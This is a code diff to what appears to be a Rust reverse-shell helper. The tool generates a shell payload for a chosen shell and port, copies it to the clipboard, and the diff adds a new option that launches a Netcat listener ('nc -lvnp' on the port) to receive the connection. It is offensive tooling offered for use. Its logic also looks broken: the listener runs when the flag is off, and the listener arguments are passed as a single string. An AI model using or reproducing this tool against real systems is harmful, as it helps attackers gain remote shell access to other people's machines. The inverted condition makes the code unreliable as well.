@@ -1,7 +1,9 @@
+use arboard::Clipboard;
 use structopt::StructOpt;
 use strum::VariantNames;
 use strum_macros::{EnumString, EnumVariantNames};
-use arboard::Clipboard;
+
+use std::process::Command;
 
 #[derive(Debug, EnumString, EnumVariantNames)]
 #[strum(serialize_all = "kebab_case")]
@@ -37,12 +39,15 @@ struct Options {
 
     #[structopt(short, long, possible_values = &Shells::VARIANTS)]
     shell: Shells,
+
+    #[structopt(short, long)]
+    reverse_shell: bool,
 }
 
 fn main() {
+    // Generate payload and paste into system clipboard
     let mut clipboard = Clipboard::new().unwrap();
     let options = Options::from_args();
-    dbg!(&options);
 
     let shell_string = match options.shell {
         Shells::Bash => "/bin/bash",
@@ -59,4 +64,16 @@ fn main() {
 
     println!("{}", payload);
     clipboard.set_text(payload).unwrap();
+    println!("Payload has been copied into system clipboard!");
+
+    // Start reverse shell
+    if !options.reverse_shell {
+        match Command::new("nc")
+            .arg(format!("-lvnp {}", options.port))
+            .output()
+        {
+            Ok(_) => (),
+            Err(_) => println!("Failed to start reverse shell. Maybe Netcat is not installed?"),
+        }
+    }
 }
